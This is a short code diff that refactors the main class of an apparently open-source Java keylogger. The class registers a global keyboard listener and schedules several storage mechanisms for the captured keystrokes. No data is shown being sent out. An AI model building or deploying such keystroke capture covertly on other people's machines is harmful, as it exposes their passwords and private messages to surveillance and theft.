@@ -1,20 +1,20 @@
 package com.keytracker;
 
 
-import com.keytracker.threads.ScheduleRunner;
+import com.keytracker.storing.StoreMechanism;
+import com.keytracker.threads.MechanismsScheduleRunner;
 import de.ksquared.system.keyboard.GlobalKeyListener;
 import de.ksquared.system.keyboard.KeyListener;
 
-import java.util.concurrent.TimeUnit;
+import java.util.List;
 
 public class KeyboardLoggerApp {
     public static void main(String[] args) {
         KeyTrackerService keyTrackerService = new KeyTrackerService(args);
         KeyListener keyListener = keyTrackerService.getKeyListener();
-        StoreMechanism storeMechanism = keyTrackerService.getStoreMechanism();
+        List<StoreMechanism> storeMechanisms = keyTrackerService.getStoreMechanisms();
 
         new GlobalKeyListener().addKeyListener(keyListener);
-
-        new ScheduleRunner(storeMechanism).scheduleAll(15, 15, TimeUnit.SECONDS);
+        new MechanismsScheduleRunner(storeMechanisms).scheduleAll();
     }
 }
